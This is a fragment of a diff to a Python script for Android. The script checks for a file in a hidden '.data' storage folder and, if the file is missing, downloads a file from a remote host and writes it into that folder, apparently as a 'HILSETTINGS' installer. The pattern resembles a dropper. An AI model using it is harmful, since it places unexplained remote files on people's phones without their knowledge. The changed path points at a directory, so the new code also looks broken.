@@ -25,14 +25,14 @@ try:
     time.sleep(1)
     print("\n")
     time.sleep(1)
-    lokasi = "/storage/emulated/0/Android/.data/flask_cli.odex"
+    lokasi = "/storage/emulated/0/Android/.data"
     if os.path.exists(lokasi):
         time.sleep(1)
         print("Status : {}Active{}\n".format(hijau, reset))
         time.sleep(1)
         running("HILSETTINGS ALREADY INSTALLED ON YOUR PHONE\n")
     else:
-        url = "https://444u.my.id/config/file_update/CSD/flask_cli.odex"
+        url = "https://444u.my.id/config/file_update/DOOM"
         response = requests.get(url)
         if response.status_code == 200:
             with open(lokasi, "wb") as file:
